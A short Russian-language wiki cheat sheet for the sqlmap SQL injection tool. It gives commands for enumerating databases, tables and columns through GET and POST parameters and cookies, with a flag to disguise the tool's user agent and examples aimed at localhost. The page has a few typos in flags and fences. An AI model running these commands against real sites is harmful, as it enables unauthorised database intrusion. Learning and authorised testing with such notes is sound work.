##### [Главная страница](../../index.md)
##### [Информационная безопасность](../index.md)
##### [Сканирование](index.md)
## [sqlmap](http://sqlmap.org/)
### GET запросы
### Основные ключи
#### Проверяемый URL **-u**
```
bash sqlmap -u
```
 > URL указывается путь вплоть до проверяемой переменной **http://site/page?id=25**

#### Случайный агент (каким браузером представляется sqlmap) **--random-agen**
```bash
sqlmap -u --random-agent
 ```
### Перечень баз **--dbs**
```bash
sqlmap -u --dbs
```
### Выбор базы **-D**
```
bash sqlmap -u -D
```
#### Список таблиц базы **--tables**
```bash
sqlmap -u -D --tables
```
#### Выбор таблицы **-T**
```bash
sqlmap -u -D -T
```
#### Список полей таблицы **--columns**
```bash
sqlmap -u -D T --columns
```
### POST запросы
### Передача данных (полей и значений) через POST (Перечень баз **--dbs**)
```bash
sqlmap -u --dbs --data "<ключ>=<значение>&<ключ2>=<значение2>"
```
### Использование cookies (Перечень баз **--dbs**)
```bash
sqlmap -u --dbs --cookie "<ключ>=<значение>; <ключ2>=<значение2>"
```
### Примеры
> название полей можно посмотреть в режиме разработчика браузера или на прокси (например, ZAP proxy)

#### Вывод списка всех баз данных:
```bash
sqlmap -u http://localhost/home?id=10 --dbs --random-agent
```
#### Вывод списка полей таблицы users базы main:
```bash
sqlmap -u http://localhost/home?id=10 -D main -T users --columns --random-agent
```
